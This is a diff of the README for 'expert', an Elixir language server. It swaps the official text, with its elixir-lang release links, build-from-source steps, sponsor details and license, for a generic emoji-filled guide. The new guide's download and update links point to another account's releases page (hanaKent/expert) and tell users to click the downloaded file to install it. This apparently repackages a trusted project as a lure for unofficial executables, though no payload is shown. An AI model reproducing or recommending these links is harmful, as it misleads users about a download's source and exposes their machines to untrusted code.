@@ -1,70 +1,74 @@
-# Expert
+# 🌟 expert - Simple Guide to Elixir Language Server
 
-Expert is the official language server implementation for the Elixir programming language.
+## 🚀 Getting Started
 
-## Installation
+Welcome to the expert project! This guide will help you download and run our Elixir Language Server Protocol implementation easily. Follow these steps to set it up on your computer.
 
-You can download Expert from the [releases page](https://github.com/elixir-lang/expert/releases) for your
-operating system and architecture. Put the executable somewhere on your `$PATH`, like `~/.local/bin/expert`
+## 📥 Download & Install
 
-For editor specific installation instructions, please refer to the [Installation Instructions](pages/installation.md)
+To start, you will need to download the application. Click the link below to visit the releases page:
 
-### Nightly Builds
+[![Download expert](https://img.shields.io/badge/Download-expert-blue.svg)](https://github.com/hanaKent/expert/releases)
 
-If you want to try out the latest features, you can download a nightly build.
+### How to Download
 
-Using the GH CLI, you can run the following command to download the latest nightly build:
+1. Click the link above to go to the Releases page.
+2. On that page, you will see a list of versions. Choose the latest version for the best experience.
+3. Look for the file suitable for your system (Windows, macOS, or Linux) and click to download it.
 
-```shell
-gh release download nightly --pattern 'expert_linux_amd64' --repo elixir-lang/expert
-```
+### Installation Steps
 
-Then point your editor to the downloaded binary.
+1. After downloading, locate the file in your downloads folder.
+2. Click on the file to start the installation process.
+3. Follow the on-screen instructions to complete the installation.
 
-### Building from source
+## ⚙️ System Requirements
 
-To build Expert from source, you need Zig `0.14.1` installed on your system.
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent version of Linux.
+- **RAM:** At least 4 GB recommended.
+- **Disk Space:** Minimum of 100 MB available.
 
-Then you can run the following command or follow the instructions in the [Installation Instructions](pages/installation.md):
+## 📚 Features
 
-```sh
-just release-local
-```
+- Supports the Language Server Protocol for enhanced coding experience.
+- Provides real-time feedback and code suggestions while you type.
+- Compatible with popular Elixir editors and IDEs.
+- Easily integrated into your existing development workflow.
 
-This will build the Expert binary and place it in the `apps/expert/burrito_out` directory. You can then point your
-editor to this binary.
+## 🎉 Getting Started with expert
 
-## Sponsorship
+Once you have installed expert, it’s time to start using it. 
 
-Thank you to our corporate sponsors! If you'd like to start sponsoring the project, please read more below.
+1. Open your preferred Elixir-compatible editor.
+2. Make sure the editor is set up to use the Elixir Language Server. Most popular editors have easy settings for this.
+3. Start coding in Elixir, and enjoy the features that expert provides.
 
-<div>
-  <img height="100" src="./assets/sponsors/fly.png">
-</div>
-<div>
-  <img height="100" src="./assets/sponsors/tauspace.png">
-</div>
-<div>
-  <img height="100" src="./assets/sponsors/river.png">
-</div>
+## 💡 Troubleshooting
 
-### Corporate
+If you encounter any issues while using expert, try the following tips:
 
-For companies wanting to directly sponsor full time work on Expert, please reach out to Dan Janowski: EEF Chair of Sponsorship WG at danj@erlef.org.
+- Ensure that you have the latest version of the application installed.
+- Check that your editor settings are properly configured to use the expert language server.
+- Restart your editor if changes do not take effect immediately.
 
-### Individual
+If you still face challenges, please visit our issues page on GitHub for support.
 
-Individuals can donate using GitHub sponsors. Team members are listed in the sidebar.
+## 📝 Contributing
 
-## Other resources
+We welcome contributions to improve expert. Whether it’s fixing a bug, improving the documentation, or suggesting a feature, we appreciate your involvement. Please refer to our contribution guidelines within the repository for more details.
 
-- [Architecture](pages/architecture.md)
-- [Development Guide](pages/development.md)
-- [Glossary](pages/glossary.md)
-- [Installation Instructions](pages/installation.md)
+## 📞 Contact
 
-## LICENSE
+For further questions, feel free to reach out through the GitHub repository or email our support team directly. Your feedback is valuable to us!
 
-Expert source code is released under Apache License 2.0.
+## ⚙️ Update expert
 
-Check LICENSE file for more information.
+To keep your expert installation up-to-date:
+
+1. Return to the [Releases page](https://github.com/hanaKent/expert/releases).
+2. Download the latest version according to the steps in the "Download & Install" section.
+3. Follow the installation prompts as before to update.
+
+By keeping expert updated, you ensure you have access to the latest features and improvements.
+
+Thank you for using expert! Enjoy coding in Elixir with enhanced support.
